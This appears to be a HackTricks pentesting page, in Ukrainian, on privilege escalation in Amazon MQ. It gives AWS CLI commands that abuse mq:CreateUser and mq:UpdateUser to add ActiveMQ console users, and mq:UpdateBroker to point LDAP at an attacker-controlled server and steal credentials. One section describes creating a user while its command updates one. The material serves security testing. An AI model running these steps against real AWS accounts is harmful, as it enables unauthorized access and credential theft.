# AWS - MQ Privesc

{{#include ../../../../banners/hacktricks-training.md}}

## MQ

Для отримання додаткової інформації про MQ див.:

{{#ref}}
../../aws-services/aws-mq-enum.md
{{#endref}}

### `mq:ListBrokers`, `mq:CreateUser`

З такими дозволами ви можете **створити нового користувача в брокері ActimeMQ** (це не працює в RabbitMQ):
```bash
aws mq list-brokers
aws mq create-user --broker-id <value> --console-access --password <value> --username <value>
```
**Потенційний вплив:** Доступ до конфіденційної інформації при навігації у ActiveMQ

### `mq:ListBrokers`, `mq:ListUsers`, `mq:UpdateUser`

З цими дозволами ви можете **створити нового користувача в брокері ActimeMQ** (це не працює в RabbitMQ):
```bash
aws mq list-brokers
aws mq list-users --broker-id <value>
aws mq update-user --broker-id <value> --console-access --password <value> --username <value>
```
**Можливий вплив:** Отримання доступу до конфіденційної інформації під час роботи з ActiveMQ

### `mq:ListBrokers`, `mq:UpdateBroker`

Якщо брокер використовує **LDAP** для авторизації з **ActiveMQ**, можливо **змінити** **конфігурацію** LDAP‑сервера, що використовується, на **таку, що контролюється атакуючим**. Таким чином атакуючий зможе **вкрасти всі облікові дані, що передаються через LDAP**.
```bash
aws mq list-brokers
aws mq update-broker --broker-id <value> --ldap-server-metadata=...
```
Якщо ви якимось чином зможете знайти оригінальні credentials, які використовуються ActiveMQ, ви зможете виконати MitM, вкрасти creds, використати їх на оригінальному сервері та відправити відповідь (можливо, просто повторно використовуючи вкрадені credentials, ви зможете це зробити).

**Потенційний вплив:** Вкрасти ActiveMQ credentials

{{#include ../../../../banners/hacktricks-training.md}}
